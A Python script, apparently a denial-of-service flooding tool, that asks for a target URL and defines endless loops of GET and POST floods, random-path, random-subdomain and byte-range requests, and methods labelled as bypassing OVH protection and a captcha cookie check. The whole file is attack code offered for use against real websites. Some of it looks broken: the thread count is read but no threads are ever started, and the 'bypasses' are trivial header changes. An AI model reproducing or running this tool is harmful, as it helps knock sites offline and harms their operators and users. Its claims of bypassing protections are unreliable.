import requests
import concurrent.futures
import random
import string
import time

target_url = input("Enter the target website URL: ")
num_threads = int(input("Enter the number of threads to use for concurrent requests: "))

# Method: Flood with GET Requests and Heavy Payload
def get_flood():
    while True:
        try:
            payload = ''.join(random.choices(string.ascii_uppercase + string.digits, k=1024))  # Generate a 1KB payload
            headers = {'Content-Length': str(len(payload))}
            response = requests.get(target_url, headers=headers, data=payload)
            # Additional processing logic can be added here if needed
            print("GET request sent to", target_url)
        except requests.exceptions.RequestException as e:
            print("An error occurred:", str(e))

# Method: Flood with POST Requests
def post_flood():
    while True:
        try:
            response = requests.post(target_url)
            # Additional processing logic can be added here if needed
            print("POST request sent to", target_url)
        except requests.exceptions.RequestException as e:
            print("An error occurred:", str(e))

# Method: Bypass OVH and send GET request
def ovh_bypass():
    while True:
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
            response = requests.get(target_url, headers=headers)
            # Additional processing logic can be added here if needed
            print("Bypassed OVH and sent GET request to", target_url)
        except requests.exceptions.RequestException as e:
            print("An error occurred:", str(e))

# Method: Send GET request with random HEX
def ovh_random_hex():
    while True:
        try:
            hex_string = ''.join(random.choice('0123456789ABCDEF') for _ in range(32))
            url = f"{target_url}/{hex_string}"
            response = requests.get(url)
            # Additional processing logic can be added here if needed
            print("Sent GET request with random HEX to", url)
        except requests.exceptions.RequestException as e:
            print("An error occurred:", str(e))

# Method: Bypass chk_captcha and send GET request
def ovh_bypass_captcha():
    while True:
        try:
            headers = {'Cookie': 'chk_captcha=1'}
            response = requests.get(target_url, headers=headers)
            # Additional processing logic can be added here if needed
            print("Bypassed chk_captcha and sent GET request to", target_url)
        except requests.exceptions.RequestException as e:
            print("An error occurred:", str(e))

# Method: Send HTTP Packet with high byte range
def stress():
    while True:
        try:
            headers = {'Range': 'bytes=100000-'}
            response = requests.get(target_url, headers=headers)
            # Additional processing logic can be added here if needed
            print("Sent stress request to", target_url)
        except requests.exceptions.RequestException as e:
            print("An error occurred:", str(e))

# Method: Send GET request with random SubDomain
def dyn():
    while True:
        try:
            subdomain = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(10))
            url = f"https://{subdomain}.{target_url}"
            response = requests.get(url)
            # Additional processing logic can be added here if needed
            print("Sent GET request with random SubDomain to", url)
        except requests.exceptions.RequestException as e:
            print("An error occurred:", str(e))
